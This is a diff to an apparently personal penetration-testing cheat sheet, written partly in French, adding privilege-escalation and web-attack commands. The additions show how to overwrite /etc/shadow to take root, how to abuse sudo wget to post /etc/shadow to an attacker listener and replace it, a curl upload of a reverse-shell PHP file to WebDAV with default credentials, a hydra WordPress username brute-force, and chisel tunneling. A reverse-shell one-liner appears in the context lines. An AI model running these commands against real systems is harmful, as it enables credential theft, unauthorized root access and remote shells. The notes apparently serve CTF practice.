@@ -77,10 +77,58 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -o -type  f 2>/dev/null
 find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
 
 #chercher les binaire qui peuvent être exécuter avec le groupe <groupe_name>
 find / -group admin -perm /g=x 2>/dev/null
 
+
+###USE /etc/shadow to be root
+
+-download /etc/shadow on local machine
+-create a new password for root:
+    openssl passwd -6 -salt 'salt' 'password'
+-replace the root password in shadow file
+    
+example : root:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:18195:0:99999:7:::
+
+-upload the shadow file in victime machine and replace the /etc/shadow file
+-then connect as root with the created password
+    su root
+
+
+*************************************** wget privesc *******************************
+
+#remote
+sudo -l
+
+(root) NOPASSWD: /usr/bin/wget
+
+
+#local
+nc -lvnp 4444
+
+#remote
+sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
+
+#local
+vim shadow.txt
+
+# -6: SHA512
+openssl passwd -6 -salt 'salt' 'password'
+
+
+#local
+root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::
+
+#local
+python3 -m http.server 8000
+
+#remote
+sudo /usr/bin/wget http://<local-ip>:8000/shadow.txt -O /etc/shadow 
+
+#remote
+su root
 
 
 
@@ -119,6 +167,9 @@ network.security.ports.banned.override
 
 #faire une requête en spécifiant le user-agent
 curl -A "<user-agent>" -L <ip_address>
+
+#file upload on a webdav
+curl --user "wampp:xampp" http://<ip_address>/webdav/ --upload-file <reverse_shell>.php -v
 
 
 
@@ -166,3 +217,35 @@ ssh -L <reverse_port>:127.0.0.1:<port> -i <private_key> <username>@<target_ip_ad
 
 -attacker side
 ./chisel server --reverse --port <exposed_port>
+
+
+
+################################# WORDPRESS TRICKS ####################################
+
+#TEST VALIDE USER (permet de en fonction de la réponse du serveur si le username est correct)
+hydra -L ./fsocity.dic -p test 10.10.201.188 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
+
+
+################################# COMMANDES UTILES DE LINUX ##########################
+
+#Créer un nouvelle utilisateur
+sudo useradd -m <nom_d'utilisateur>
+
+#lui attribuer un password
+sudo echo "<nom-d'utilisateur>:<password> | sudo chpasswd
+
+#lui attribuer un shell
+sudo chsh -s /bin/bash <nom_d'utilisateur>
+
+#définir comme hostanme
+sudo hostnamectl set-hostname <nom_d'utilisateur>
+
+#écrire un fichier sur plusieurs lignes
+cat << EOF > <nom_du_fichier>
+contenu
+contenu
+contenu
+EOF
+
+
+
